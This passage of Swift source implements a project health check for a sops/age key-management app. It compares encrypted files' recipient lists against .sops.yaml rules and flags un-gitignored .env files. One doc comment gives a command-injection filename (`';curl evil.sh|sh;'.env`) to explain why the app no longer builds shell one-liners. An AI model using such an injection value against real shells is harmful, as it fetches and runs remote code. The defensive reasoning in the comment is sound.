import Foundation
import SopsEngine

public struct InspectedProject: Equatable, Sendable {
    public let name: String
    public let rootPath: String

    public init(name: String, rootPath: String) {
        self.name = name
        self.rootPath = rootPath
    }
}

public protocol ProjectSourceProviding: Sendable {
    var projects: [InspectedProject] { get }
}

/// PROPOSAL.md §6 D.
///
/// Honesty constraint: this app holds only public keys. It can confirm that a
/// public key *appears in a file's recipient list* — that is a fact it can
/// read straight from the file. It cannot confirm that the holder of that key
/// can actually decrypt the file, because that would need their private key,
/// which this app never has. Every user-facing string this check produces
/// must preserve that distinction: "is encrypted to" / "is not in the key
/// list", never "can decrypt" / "cannot decrypt".
///
/// Never-log constraint: the plaintext-leak finding below reports that a file
/// such as `.env` exists and is not gitignored. It names the file so the user
/// knows what to fix. It must never read or quote the file's contents — not a
/// value, not a fragment, not a preview line — because a finding is exactly
/// the kind of text that gets screenshotted or captured in a log.
///
/// `.sops.yaml` parsing history, for whoever touches this next: this check
/// used to parse `.sops.yaml` with a hand-rolled Swift YAML scanner. Across
/// three review rounds it shipped three different silent-corruption bugs —
/// a nested block list misread as a new rule, a flow list read as one
/// recipient with a stray bracket, and two unrelated rules glued together by
/// a whole-document bracket-balance check that quoted-value brackets in
/// different rules could cancel out against. The pattern was the parser, not
/// any individual bug in it. `.sops.yaml` parsing is now delegated entirely
/// to `SopsBridge.lookupCreationRule`, which crosses into
/// `github.com/getsops/sops/v3/config` — sops's own config parser, the exact
/// code every other sops command uses to answer the same question. This
/// app's understanding of a `.sops.yaml` can no longer drift from what sops
/// itself does with it. See `EncryptedFileMetadata` below for the one piece
/// of text-scanning that remains Swift-side, and its own doc comment for why
/// that one is a materially different, narrower problem.
public struct ProjectHealthCheck: HealthCheck {
    public let id = "project-health"
    public let category = HealthCategory.projects

    private let source: any ProjectSourceProviding
    /// Used for one thing: finding `git`, which answers the gitignore
    /// question. Injected rather than hardcoded to `/usr/bin/git` for the same
    /// reason `ExternalToolCheck` uses it — a GUI app launched from Finder has
    /// no useful process `PATH`.
    private let locator: any ToolLocating

    public init(source: any ProjectSourceProviding, locator: any ToolLocating = ToolLocator()) {
        self.source = source
        self.locator = locator
    }

    public func run() async -> [HealthFinding] {
        let projects = source.projects
        guard !projects.isEmpty else {
            return [HealthFinding(
                id: "project.none", title: "Projects",
                status: .skipped(reason: "No projects have been added yet."),
                detail: "Add a project to have its .sops.yaml and encrypted files checked.")]
        }

        // Located once for the whole run, not once per project.
        let gitPath = await locator.locate("git", versionArguments: ["--version"])?.path

        // Finding ids are scoped by the project's *position*, never by its
        // display name.
        //
        // The previous scheme built ids from the name and disambiguated
        // duplicates by appending "-2", "-3" — which manufactures exactly the
        // collision it was written to prevent: `[acme, acme, acme-2]` yields
        // `project.acme-2.…` twice, once for the disambiguated second "acme"
        // and once for the project actually named "acme-2". `HealthFinding` is
        // `Identifiable` and every surface renders findings in a `ForEach`, so
        // that makes row identity undefined. Names containing dots break it
        // further, the id's own separator being part of the value.
        //
        // An index cannot collide with another index. Deriving identity from
        // anything the user types is the bug; the fix is to stop. The user's
        // own name is unaffected — it is shown in `title`, verbatim.
        //
        // Sequential across projects, not a `TaskGroup` fan-out: each
        // project's own scan already parallelises its tail reads
        // (`ProjectScanner.tailReadConcurrencyWidth`), and running multiple
        // projects' scans concurrently on top of that would multiply file
        // descriptor pressure rather than wall clock — out of scope for what
        // this task measured. A `for` loop replaces the previous `flatMap`
        // only because `findings(for:)` must now `await` the scan; ordering
        // and result shape are otherwise unchanged.
        var allFindings: [HealthFinding] = []
        for (index, project) in projects.enumerated() {
            allFindings.append(contentsOf: await findings(for: project, idScope: String(index), gitPath: gitPath))
        }
        return allFindings
    }

    private func findings(for project: InspectedProject, idScope: String,
                          gitPath: String?) async -> [HealthFinding] {
        let root = URL(fileURLWithPath: project.rootPath)
        let configURL = root.appendingPathComponent(".sops.yaml")

        // One walk of the tree feeds both findings below.
        let tree = await ProjectScanner.scan(root: root)

        // The directory this project points to is gone — deleted, unmounted,
        // renamed. Nothing below this point ran against anything: the walk
        // never visited a single file, and `configURL`'s own existence check
        // would report "No .sops.yaml" as if it had actually looked, which is
        // exactly the same false confidence as the gitignore finding's
        // "found none" over a scan that never happened. One honest finding
        // replaces all three project findings — sops-yaml, recipients,
        // gitignore — rather than three separately-worded ways of not
        // admitting the same thing. `ProjectSidebar` already surfaces this
        // exact fact today (`ProjectStore.isMissing`, badge in the sidebar);
        // this is the same signal reaching the health report, computed the
        // same way sops-yaml's own existence check below is: reading the
        // filesystem this check already walks, without adding a field to
        // `InspectedProject` that every other call site would then have to
        // keep in sync with the filesystem too.
        guard !tree.rootMissing else {
            return [HealthFinding(
                id: "project.\(idScope).missing", title: "\(project.name): project directory",
                status: .warning,
                detail: "The directory this project points to, \(project.rootPath), could not be found. Nothing here was checked — not .sops.yaml, not encrypted files, not gitignore status — because there was nothing to look at.",
                remediation: Remediation(
                    explanation: "If the directory was moved or renamed, remove this project and re-add it at the new location. If it was deleted or is on an unmounted volume, removing it here only stops tracking it — nothing on disk is touched either way."))]
        }

        let leak = gitignoreFinding(for: project, idScope: idScope, root: root,
                                    tree: tree, gitPath: gitPath)

        guard FileManager.default.fileExists(atPath: configURL.path) else {
            // The plaintext-leak finding is emitted even here. A project with
            // no .sops.yaml is the *most* likely one to have secrets sitting
            // in plaintext, so suppressing that finding until a config exists
            // would hide it exactly when it matters most.
            return [HealthFinding(
                id: "project.\(idScope).sops-yaml", title: "\(project.name): .sops.yaml",
                status: .warning,
                detail: "No .sops.yaml in \(project.rootPath). Without it, sops has no rules for which keys to encrypt new files to.",
                remediation: Remediation(
                    // Was "Create one from the .sops.yaml wizard in this
                    // app." — a real defect, caught only once this check ran
                    // against a real project for the first time (this task):
                    // no such wizard exists anywhere in this app. PROPOSAL.md
                    // §5 lists one as a future Help feature; nothing in this
                    // milestone or any earlier one builds it. Telling the
                    // user to go use a tool that isn't there is exactly the
                    // "claims more than it established" failure this app's
                    // findings are held to — so until the wizard exists, say
                    // what the user can actually do today: write the file by
                    // hand. When the wizard ships, this remediation is where
                    // it should point.
                    explanation: "Add a .sops.yaml file at the project root with a creation_rules entry naming the age public keys new files should be encrypted to. This app does not have a .sops.yaml generator yet — see sops's own documentation for the file format.")), leak]
        }

        // Probe that the config itself loads under sops's own parser,
        // independent of any specific file. The target path is never used
        // for anything but path_regex matching (sops does no I/O on it), so
        // a synthetic, non-existent name is fine here — only the "did the
        // config load" outcome from this call is used.
        let probeTarget = root.appendingPathComponent(".sops-health-check-probe").path
        do {
            _ = try SopsBridge.lookupCreationRule(configPath: configURL.path, targetFilePath: probeTarget)
        } catch {
            return [HealthFinding(
                id: "project.\(idScope).sops-yaml", title: "\(project.name): .sops.yaml",
                status: .problem,
                detail: "The .sops.yaml in \(project.rootPath) could not be parsed: \(error).",
                remediation: Remediation(
                    explanation: "Fix the YAML syntax, then re-run this check.")), leak]
        }

        return [
            HealthFinding(id: "project.\(idScope).sops-yaml",
                          title: "\(project.name): .sops.yaml", status: .ok,
                          detail: "The .sops.yaml in \(project.rootPath) parses successfully."),
            recipientFinding(for: project, idScope: idScope, root: root,
                             configPath: configURL.path, tree: tree),
            leak,
        ]
    }

    /// How many excluded directory names a scope sentence spells out before it
    /// switches to "and N more".
    ///
    /// `ProjectScanner.skippedDirectoryNames` has twenty entries, so an
    /// unsummarised worst case is a twenty-item comma list in the middle of a
    /// paragraph — a wall nobody reads, which is the same "the user cannot
    /// actually act on this" failure as saying nothing at all, dressed up as
    /// diligence. Eight covers every realistic project outright: this
    /// repository hits three (`.git`, `.build`, `.swiftpm`), a JS monorepo
    /// four or five (`.git`, `node_modules`, `dist`, `.next`), and reaching
    /// nine means a tree that is simultaneously a JS, Swift, Rust, Go, Ruby,
    /// Python and Terraform project — at which point the individual names
    /// have stopped being the information and the *count* has started being
    /// it.
    ///
    /// What is never summarised away is the count itself: the sentence always
    /// states exactly how many names are not shown, so the size of the
    /// exclusion is never hidden, only the tail of an alphabetical list.
    static let excludedNamesShown = 8

    /// The opening clause every scope disclosure starts with, and the only
    /// one. Factored out because it is the structural guarantee, not just a
    /// string: exactly one of these appears per finding, so the excluded-only,
    /// truncated-only and both-at-once cases read as one account of what was
    /// missed rather than as two paragraphs a reader has to reconcile.
    static let scopeLeadIn = "Not everything under this project was looked at"

    /// What this walk deliberately or unavoidably did not cover, as one
    /// paragraph — or `nil` when it covered the whole tree and there is
    /// nothing to disclose.
    ///
    /// PROPOSAL.md §6 D makes this mandatory for the exclusion route in as
    /// many words: the exclusion "must be *stated in the finding*, not buried
    /// in a constant", and "the check may not report OK about files it did not
    /// look at". Before this existed, the exclusion was disclosed in exactly
    /// one place — inside `recipientFinding`'s `tree.wasTruncated` branch — so
    /// a scan that skipped `.build` and `.swiftpm` and never came near the
    /// 20,000-file budget disclosed nothing whatsoever, and the plaintext
    /// finding announced "Looked through <root> … and found none" over a tree
    /// it had declined to enter parts of. Reproduced against this app's own
    /// repository, which is exactly the shape that triggers it.
    ///
    /// Nothing here is excused from disclosure, `.git` included. It is
    /// tempting to treat VCS internals as too obvious to mention, but a
    /// carve-out list of "exclusions that don't count" is the silent constant
    /// this whole function exists to abolish, re-created one level down — and
    /// `.git/config` holding a remote URL with an embedded token is an
    /// ordinary way to leak a credential, not a hypothetical.
    ///
    /// The names, not paths: `ProjectScanner` skips by directory *name*
    /// anywhere in the tree, so "this scan never enters `.build`" is the
    /// accurate statement and a list of the specific paths it declined would
    /// be both longer and less true.
    static func scanScopeSentence(tree: ScannedTree) -> String? {
        let excluded = tree.skippedDirectoryNames.sorted()
        let budget = "it stopped at its scan budget of \(ProjectScanner.maxScannedFiles) files, so an unknown number of the files past that point were never opened"

        switch (excluded.isEmpty, tree.wasTruncated) {
        case (true, false):
            return nil
        case (true, true):
            return "\(scopeLeadIn): \(budget). Nothing above is a statement about them."
        case (false, false):
            let plural = excluded.count == 1
            return "\(scopeLeadIn): this scan never enters \(excludedDirectoryList(excluded)), "
                + "\(plural ? "a directory name" : "directory names") this app always skips as dependency, build or version-control output. "
                + "Nothing above is a statement about what is inside \(plural ? "it" : "them"), so treat this as a verdict on the rest of the tree only."
        case (false, true):
            // Both at once, said once. Two separate paragraphs — one about the
            // exclusion, one about the budget — read as two competing accounts
            // of the same walk; a reader has to work out whether they overlap.
            // One sentence with two clauses does not have that problem.
            return "\(scopeLeadIn), for two reasons at once: this scan never enters "
                + "\(excludedDirectoryList(excluded)) — \(excluded.count == 1 ? "a directory name" : "directory names") this app always skips as dependency, build or version-control output — and then \(budget) either. "
                + "Nothing above is a statement about either group."
        }
    }

    /// Excluded directory names as a sentence fragment, summarised past
    /// `excludedNamesShown` — see that constant for why, and for what is
    /// deliberately never summarised away.
    private static func excludedDirectoryList(_ sorted: [String]) -> String {
        guard sorted.count > excludedNamesShown else {
            guard let last = sorted.last else { return "" }
            guard sorted.count > 1 else { return last }
            return sorted.dropLast().joined(separator: ", ") + " and " + last
        }
        return sorted.prefix(excludedNamesShown).joined(separator: ", ")
            + " and \(sorted.count - excludedNamesShown) more"
    }

    /// Human-readable label for a sops master-key type identifier
    /// (`keys.MasterKey.TypeToIdentifier()`, e.g. from
    /// `CreationRuleLookup.nonAgeBackends` or
    /// `EncryptedFileMetadata.nonAgeBackends(inEncryptedFile:)`).
    private static func backendLabel(_ key: String) -> String {
        switch key {
        case "pgp": return "PGP"
        case "kms": return "AWS KMS"
        case "gcp_kms": return "GCP KMS"
        case "hckms": return "HC Vault KMS"
        case "azure_kv": return "Azure Key Vault"
        case "hc_vault": return "HashiCorp Vault"
        case "key_groups": return "key groups"
        default: return key
        }
    }

    /// Backend identifiers as a sentence fragment: "PGP", "AWS KMS and
    /// HashiCorp Vault", "AWS KMS, PGP and HashiCorp Vault". Sorted by the
    /// label a reader sees, not by the identifier behind it — sorting by
    /// identifier puts "HashiCorp Vault" (hc_vault) before "AWS KMS" (kms),
    /// which reads like a mistake.
    private static func backendList(_ keys: some Collection<String>) -> String {
        let labels = keys.map(backendLabel).sorted()
        guard let last = labels.last else { return "" }
        guard labels.count > 1 else { return last }
        return labels.dropLast().joined(separator: ", ") + " and " + last
    }

    /// One spelling for a path, so a file found by directory enumeration can
    /// be reported relative to the project root the user gave us.
    ///
    /// Two things get in the way. Symlinked roots: a root under `/var` (a
    /// symlink to `/private/var`) enumerates its contents as `/private/var/…`,
    /// so stripping the root's own spelling as a prefix fails and the whole
    /// absolute path lands in the finding. And Foundation's own asymmetry:
    /// `resolvingSymlinksInPath()` *removes* a leading `/private`, it does not
    /// add one, so it alone does not reconcile the two. Normalizing both sides
    /// the same way — resolve, then drop a leading `/private` — does.
    private static func canonicalPath(_ path: String) -> String {
        let resolved = URL(fileURLWithPath: path).resolvingSymlinksInPath().path
        return resolved.hasPrefix("/private/") ? String(resolved.dropFirst("/private".count)) : resolved
    }

    /// Compares each encrypted file's actual key list against the rule that
    /// governs it. This is a comparison of two lists of public keys read from
    /// disk — see the type-level doc comment for what it does and does not
    /// prove about decryption.
    ///
    /// Age is not the only backend sops supports, and this app only ever holds
    /// age keys. Three independent signals say "part of this project is
    /// something this app cannot evaluate", and all three must reach the user
    /// rather than falling through to `.ok`:
    ///
    /// 1. **The config as a whole** (`SopsBridge.inspectConfigBackends`) —
    ///    which backends `.sops.yaml` names anywhere, files or no files. This
    ///    is the only signal that can see a rule declaring pgp/KMS/Vault that
    ///    *no file currently matches*. Without it, such a rule was invisible:
    ///    the per-file lookup below never resolves it, nothing lands in the
    ///    unverifiable bucket, and the finding folded that silence into a
    ///    confident "every file's key list matches" — an OK about a
    ///    configuration this app cannot read at all, which PROPOSAL.md §6 D
    ///    forbids in as many words.
    /// 2. **The rule governing a specific file** (`CreationRuleLookup`).
    /// 3. **The file's own metadata** (`EncryptedFileMetadata`) — ground truth
    ///    for what actually protects it right now, which can drift from what
    ///    its rule declares.
    /// 4. **The scan itself** (`ScannedTree.wasTruncated`) — whether the walk
    ///    that produced `tree` covered the whole project or gave up at
    ///    `maxScannedFiles`. This is a different kind of gap from the other
    ///    three: it is not that some backend or file is unreadable, it is
    ///    that files may exist which were never looked at at all. Reporting
    ///    `.ok` over an incomplete walk is the same vacuous verdict every
    ///    other signal here exists to prevent, so it goes into the same
    ///    `unverifiable` bucket and blocks `.ok` the same way.
    ///
    /// Status precedence, deliberate: a genuine age-recipient mismatch is
    /// still `.problem` even when something else was unreadable — a real,
    /// actionable finding must never be buried under a caveat. Otherwise any
    /// unreadable signal makes the finding `.unknown`, never `.ok`, and the
    /// detail leads with what *was* verified so a user with one healthy age
    /// rule still learns that part is fine.
    ///
    /// `.unknown` rather than `.skipped`, though PROPOSAL.md §6 D says
    /// "Skipped": in this codebase `.skipped` means the check's subject does
    /// not exist yet (`HealthStatus`'s own doc comment; it is what "no
    /// projects have been added" reports), and `.unknown` means the check ran
    /// but could not reach a verdict. This check did run — it read the config
    /// and every encrypted file, and reached a verdict on the age part. The
    /// proposal's substantive requirement is "must never report OK about a
    /// configuration it cannot read", and `.unknown` satisfies it while
    /// ranking above `.skipped` in `HealthStatus.severity`, so a caveat
    /// cannot be hidden behind an informational status. It also keeps one
    /// vocabulary for all three signals above, which already used `.unknown`.
    private func recipientFinding(for project: InspectedProject, idScope: String, root: URL,
                                  configPath: String, tree: ScannedTree) -> HealthFinding {
        var mismatches: [String] = []
        var sawStaleRecipient = false
        var unverifiable: [String] = []
        var unreadableBackends: Set<String> = []
        var verifiedFileCount = 0

        // Signal 4: the scan itself. It does not go into `unverifiable` with
        // the per-file signals, because it is not a fact about any file — it
        // is the scope of the whole walk, and it applies to every branch
        // below including the affirmative one. It is appended, once, to
        // whatever detail this method ends up returning.
        let scope = Self.scanScopeSentence(tree: tree)
        func withScope(_ detail: String) -> String {
            scope.map { detail + "\n\n" + $0 } ?? detail
        }

        // Signal 1: the whole config, independent of which files exist.
        do {
            let declared = try SopsBridge.inspectConfigBackends(configPath: configPath).backends
            if !declared.isEmpty {
                unreadableBackends.formUnion(declared)
                unverifiable.append("This project's .sops.yaml declares \(Self.backendList(declared)) somewhere in its creation rules. This app reads age recipients only, so it did not check any rule that uses those keys — including a rule no file matches yet, which nothing else here would mention. That is a limit of this app, not a problem with those keys.")
            }
        } catch {
            unverifiable.append("This project's .sops.yaml could not be read for the list of key backends it declares (\(error)), so this app cannot tell whether every rule in it is one it is able to check.")
        }

        let rootPrefix = Self.canonicalPath(root.path) + "/"
        func relativeName(_ url: URL) -> String {
            let path = Self.canonicalPath(url.path)
            return path.hasPrefix(rootPrefix) ? String(path.dropFirst(rootPrefix.count)) : path
        }

        // Encrypted files this build cannot read at all. The bridge is
        // YAML-only in M1 (`gobridge.Format`), so a sops-encrypted .env, .json
        // or .ini carries metadata in a shape `EncryptedFileMetadata` does not
        // parse. Saying so is the point: silently omitting them from the count
        // and then reporting OK is the same vacuous verdict this whole
        // finding was rewritten to stop producing.
        for url in tree.encryptedInOtherFormats {
            unverifiable.append("\(relativeName(url)) is sops-encrypted in a format this app does not read yet — this build handles YAML only — so its recipient list was not checked.")
        }

        for sniffed in tree.encrypted {
            let relative = relativeName(sniffed.url)

            let lookup: CreationRuleLookup
            do {
                lookup = try SopsBridge.lookupCreationRule(configPath: configPath, targetFilePath: sniffed.url.path)
            } catch {
                unverifiable.append("\(relative): could not determine which rule governs it (\(error)).")
                continue
            }
            // No rule governs this file. Previously a bare `continue`, which
            // dropped the file from the report entirely and let the `.ok`
            // branch below announce that every encrypted file had been
            // checked. An encrypted file with no creation rule is precisely
            // the case where this app has nothing to compare against and must
            // say so.
            guard lookup.matched else {
                unverifiable.append("\(relative) is encrypted, but no creation rule in .sops.yaml governs it, so there is no declared key list to compare its recipients against.")
                continue
            }

            // Ground truth from the file itself: what actually protects it
            // right now, regardless of what the rule declares. The two can
            // disagree — a file encrypted before its rule changed — so both
            // are reported, except when they say exactly the same thing,
            // where two sentences saying it would just be noise.
            let ruleBackends = Set(lookup.nonAgeBackends)
            let fileBackends = Set(EncryptedFileMetadata.nonAgeBackends(inEncryptedFile: sniffed.tail))
            unreadableBackends.formUnion(ruleBackends)
            unreadableBackends.formUnion(fileBackends)

            if !ruleBackends.isEmpty, ruleBackends == fileBackends {
                unverifiable.append("\(relative) is protected by \(Self.backendList(ruleBackends)), which the rule governing it also declares. This app reads age recipients only, so its key list was not checked.")
            } else {
                if !ruleBackends.isEmpty {
                    unverifiable.append("The rule governing \(relative) also allows \(Self.backendList(ruleBackends)), which this app cannot read — it only understands age recipients.")
                }
                if !fileBackends.isEmpty {
                    unverifiable.append("\(relative) is protected, at least in part, by \(Self.backendList(fileBackends)), which this app cannot read — it only understands age recipients.")
                }
            }

            let actual = Set(EncryptedFileMetadata.recipients(inEncryptedFile: sniffed.tail))
            let expected = Set(lookup.ageRecipients)

            // Only a comparison with at least one age key on one side is a
            // real comparison. Two empty sets matching is exactly the vacuous
            // "check" that produced the original false OK, so it must never
            // be counted as a file this app verified.
            if !(actual.isEmpty && expected.isEmpty) { verifiedFileCount += 1 }

            for extra in actual.subtracting(expected).sorted() {
                mismatches.append("\(relative) is encrypted to \(extra), which is not in the key list .sops.yaml declares for it.")
                sawStaleRecipient = true
            }
            for missing in expected.subtracting(actual).sorted() {
                mismatches.append("\(relative) does not list \(missing) among its recipients, but .sops.yaml declares it for this file.")
            }
        }

        if !mismatches.isEmpty {
            // A key that was removed from .sops.yaml but still appears in a
            // file's recipient list already saw the plaintext once; removing
            // the entry from the config does not retract that. The
            // remediation says so explicitly, using "rotate" rather than
            // implying re-encryption alone fixes it.
            let rotateNote = sawStaleRecipient
                ? " If a recipient was removed on purpose, also rotate the secret values themselves — that key's holder already had a chance to see the old plaintext, and re-wrapping the file does not undo that."
                : ""
            var detail = mismatches.joined(separator: "\n")
            if !unverifiable.isEmpty {
                detail += "\n\nThis app also could not fully check:\n" + unverifiable.joined(separator: "\n")
            }
            return HealthFinding(
                id: "project.\(idScope).stale-recipients",
                title: "\(project.name): recipients", status: .problem,
                detail: withScope(detail),
                remediation: Remediation(
                    explanation: "Run updatekeys to re-wrap these files for the recipients .sops.yaml declares." + rotateNote,
                    command: "sops updatekeys <file>"))
        }

        // `tree.wasTruncated` is a status condition in its own right, not just
        // a line of prose: a walk that gave up part-way through cannot produce
        // an affirmative verdict about recipients, exactly as PROPOSAL.md §6 D
        // requires of the budget route ("the finding degrading to *Unknown*").
        // The exclusion deliberately does **not** appear here — see
        // `scanScopeSentence` and the disclosure suite for why a permanent,
        // named, bounded exclusion is stated rather than allowed to make every
        // finding in the app permanently `.unknown`.
        guard unverifiable.isEmpty, !tree.wasTruncated else {
            // Lead with what was actually verified. A user whose age rule is
            // healthy deserves to know that part is fine; they must simply
            // not read it as a verdict on the whole project.
            let verified: String
            switch verifiedFileCount {
            case 0:
                verified = "No encrypted file's age recipient list could be checked here, so this app is not vouching for this project's recipients either way."
            case 1:
                verified = "Checked 1 encrypted file's age recipient list against the rule that governs it — it matches."
            default:
                verified = "Checked \(verifiedFileCount) encrypted files' age recipient lists against the rules that govern them — they all match."
            }
            // Truncation is named first when it applies. It is the broadest
            // gap of the three — an unreadable backend is a bounded fact about
            // a named rule or file, whereas a walk that ran out of budget
            // cannot even say *which* files it missed — so it is the reason a
            // one-line status should carry.
            let reason: String
            if tree.wasTruncated {
                reason = "This project has more files than this app's scan budget, so part of the tree was never checked."
            } else if !unreadableBackends.isEmpty {
                reason = "This project uses \(Self.backendList(unreadableBackends)), which this app cannot read — it only understands age keys."
            } else {
                reason = "Part of this project's recipients could not be checked. This is not a verdict on them."
            }
            var detail = verified
            if !unverifiable.isEmpty {
                detail += "\n\nDeliberately not checked:\n"
                    + unverifiable.map { "• " + $0 }.joined(separator: "\n")
            }
            return HealthFinding(
                id: "project.\(idScope).stale-recipients",
                title: "\(project.name): recipients",
                status: .unknown(reason: reason),
                detail: withScope(detail),
                remediation: Remediation(
                    explanation: "Nothing here needs fixing on this app's account — it reports only what it read. To check the rest, use the tooling for that backend: `gpg --list-keys` for PGP, or your cloud provider's console for KMS, Key Vault or Vault. This app only manages age keys."))
        }

        // Nothing was unreadable, and nothing disagreed. That is only an
        // affirmative OK if something was actually compared.
        //
        // `verifiedFileCount` has always been the right number — it is
        // incremented only when at least one age key sits on one side of the
        // comparison, precisely so that "two empty sets are equal" is not
        // mistaken for a verified file. It just was never read here. The old
        // sentence, "Checked every encrypted file's recipient key list against
        // the rule that governs it — every file's key list matches", was
        // printed verbatim over zero files in three separate reproduced
        // situations: a project with no encrypted files at all, a project
        // whose only encrypted files were hidden, and a project whose
        // encrypted file matched no creation rule.
        guard verifiedFileCount > 0 else {
            // The subject does not exist yet: no encrypted file was found
            // anywhere under the project root. `.skipped` per
            // `HealthStatus`'s own vocabulary, and it names the fact rather
            // than implying a verdict.
            guard !tree.encrypted.isEmpty || !tree.encryptedInOtherFormats.isEmpty else {
                return HealthFinding(
                    id: "project.\(idScope).stale-recipients",
                    title: "\(project.name): recipients",
                    // "under", not "anywhere under": the walk behind this has
                    // an exclusion list, so "anywhere" was a claim it could
                    // not make. The scope paragraph in the detail says which
                    // places, and this reason no longer overstates what the
                    // one-liner covers.
                    status: .skipped(reason: "No sops-encrypted files were found under \(project.rootPath)."),
                    detail: withScope("The .sops.yaml here parses and uses age keys only, but there are no encrypted files yet, so no recipient list was compared against it. This app is not vouching for this project's recipients either way."))
            }
            // Files exist, every one of them resolved to a rule, and not one
            // comparison had an age key on either side. The check ran and
            // reached no verdict.
            return HealthFinding(
                id: "project.\(idScope).stale-recipients",
                title: "\(project.name): recipients",
                status: .unknown(reason: "No encrypted file here declares an age recipient, and neither does the rule governing it, so there was nothing to compare."),
                detail: withScope("Encrypted files were found under \(project.rootPath), but none of them — and none of the rules governing them — names a single age recipient. This app reads age recipients, so it has not verified anything about how these files are protected."))
        }

        let checked = verifiedFileCount == 1
            ? "Checked 1 encrypted file's recipient key list against the rule that governs it — it matches."
            : "Checked \(verifiedFileCount) encrypted files' recipient key lists against the rules that govern them — they all match."
        return HealthFinding(
            id: "project.\(idScope).stale-recipients",
            title: "\(project.name): recipients", status: .ok,
            detail: withScope(checked + " Every rule in .sops.yaml uses age keys only, so there is nothing here this app could not read."))
    }

    /// Reports only that a plaintext secret file exists and is not
    /// gitignored — never its contents. See the type-level doc comment.
    ///
    /// Two things changed here after the whole-branch review, both because the
    /// old version was verified wrong against `git check-ignore`:
    ///
    /// 1. **Scope.** PROPOSAL.md §6 D says "inside the repo"; the old scan
    ///    looked only at the project root, so `services/api/.env` holding a
    ///    live `sk_live_…` was invisible and the finding said "No unignored
    ///    plaintext secret files found." The scan is now the whole tree.
    /// 2. **The oracle.** Ignore status is decided by `git check-ignore`, not
    ///    by comparing `.gitignore` lines to filenames. See `GitIgnoreOracle`.
    ///
    /// When git cannot answer — no repository, no git binary — the finding is
    /// `.unknown` and still names the files it found. Guessing is what
    /// produced the false OK; a named file with an honest "could not
    /// determine" is strictly more useful than a confident wrong answer.
    ///
    /// **Why the exposed-files branch offers no command.** It used to offer
    /// `echo '<name>' >> .gitignore`, built by wrapping the filename in a pair
    /// of single quotes. That was safe only while the candidate list was three
    /// hardcoded literals; the tree walk above made it "any filename in any
    /// repository the user cloned", and a file named `';curl evil.sh|sh;'.env`
    /// turns that string into three commands. `ShellQuoting` fixes the shell
    /// layer — but a `.gitignore` line needs a *second*, different escaping
    /// layer on top of it, because gitignore reads `*`, `?`, `[`, `]`, `!`,
    /// `#` and `\` as syntax, strips trailing spaces, and anchors any pattern
    /// containing a slash. A generated one-liner correct in both layers at
    /// once is unreadable, and an unreadable command is an unauditable one —
    /// which is the whole reason PROPOSAL.md §6 hands the user a string
    /// instead of running it. Worse, a line that is shell-correct and
    /// gitignore-wrong *appears* to work while ignoring nothing, which is this
    /// branch's own failure mode all over again.
    ///
    /// So the exposed-files branch names the files and says what to do with
    /// them, and warns when a name contains gitignore syntax. PROPOSAL.md §6
    /// already lists "adding a line to `.gitignore`" among the actions inside
    /// the app's own domain that it may perform directly; when that ships, it
    /// replaces this explanation with a button, not with a better one-liner.
    ///
    /// The `.undetermined` branch keeps its command. `git check-ignore` takes
    /// a path, not a pattern — there is only the shell layer to get right, and
    /// `ShellQuoting` plus a `--` separator gets it right for every filename
    /// that can appear on one line.
    ///
    /// **Scope.** This finding is produced from the same single walk
    /// `recipientFinding` uses, and it inherits that walk's limits: the
    /// directory-name exclusion list, and the file budget. Both are stated in
    /// the detail, on every branch, via `scanScopeSentence` — the walk is
    /// never the whole tree, and "found none" is a verdict about a scope, so
    /// the scope has to be on the page next to it. Reproduced before this
    /// existed: this app scanning its own repository skipped `.build` and
    /// `.swiftpm`, never came near the budget, and reported "Looked through
    /// <root> … and found none" naming no exclusion at all.
    private func gitignoreFinding(for project: InspectedProject, idScope: String, root: URL,
                                  tree: ScannedTree, gitPath: String?) -> HealthFinding {
        let findingID = "project.\(idScope).gitignore"
        let title = "\(project.name): plaintext files"
        let candidates = tree.plaintextCandidates

        let scope = Self.scanScopeSentence(tree: tree)
        func withScope(_ detail: String) -> String {
            scope.map { detail + "\n\n" + $0 } ?? detail
        }

        let rootPrefix = Self.canonicalPath(root.path) + "/"
        func relativeName(_ url: URL) -> String {
            let path = Self.canonicalPath(url.path)
            return path.hasPrefix(rootPrefix) ? String(path.dropFirst(rootPrefix.count)) : path
        }

        // No candidate file at all is a definite answer that needs no git —
        // but only about the part of the tree the walk actually entered. A
        // walk that ran out of budget cannot say "found none" at all: it does
        // not know which files it never reached, so there is no scope left to
        // be right about. That is the budget route PROPOSAL.md §6 D describes
        // ("degrading to *Unknown* and naming what it did not reach"), applied
        // to this finding as it already was to `recipientFinding`. The
        // exclusion is handled differently and deliberately — it is named, not
        // demoted; see `scanScopeSentence`.
        guard !candidates.isEmpty else {
            guard !tree.wasTruncated else {
                return HealthFinding(
                    id: findingID, title: title,
                    status: .unknown(reason: "This project has more files than this app's scan budget, so part of the tree was never searched for plaintext secret files."),
                    detail: withScope("No plaintext files whose names conventionally hold secrets (.env and its variants) turned up in the part of \(project.rootPath) this scan reached — but it did not reach all of it, so this app is not telling you there are none."))
            }
            return HealthFinding(
                id: findingID, title: title, status: .ok,
                detail: withScope("Looked through \(project.rootPath) for plaintext files whose names conventionally hold secrets (.env and its variants) and found none."))
        }

        let names = candidates.map(relativeName).sorted()

        switch GitIgnoreOracle.classify(candidates: candidates, root: root, gitPath: gitPath) {
        case .undetermined(let reason):
            // `--` before the paths: a file called `-v.env` is an option to
            // every CLI ever written, and quoting does not change that.
            let command = ShellQuoting.singleQuotedList(names).map { "git check-ignore -v -- " + $0 }
            let explanation = command != nil
                ? "Check them yourself with the command below, and make sure anything holding a real secret is either ignored or moved into a file this app encrypts."
                : "Check them yourself with `git check-ignore -v`, and make sure anything holding a real secret is either ignored or moved into a file this app encrypts. \(Self.newlineInNameNote)"
            return HealthFinding(
                id: findingID, title: title, status: .unknown(reason: reason),
                detail: withScope("These files under \(project.rootPath) have names that conventionally hold plaintext secrets: \(names.joined(separator: ", ")). Whether they are ignored could not be established, so this app is not telling you either way."),
                remediation: Remediation(explanation: explanation, command: command))

        case .answered(let exposed, let tracked):
            guard !exposed.isEmpty else {
                let count = candidates.count == 1
                    ? "1 plaintext file whose name conventionally holds secrets"
                    : "\(candidates.count) plaintext files whose names conventionally hold secrets"
                // "git ignores all of them" is true of the files that were
                // found; over a truncated walk it is not an answer about the
                // project, for the same reason the empty-candidate branch
                // above is not.
                guard !tree.wasTruncated else {
                    return HealthFinding(
                        id: findingID, title: title,
                        status: .unknown(reason: "This project has more files than this app's scan budget, so part of the tree was never searched for plaintext secret files."),
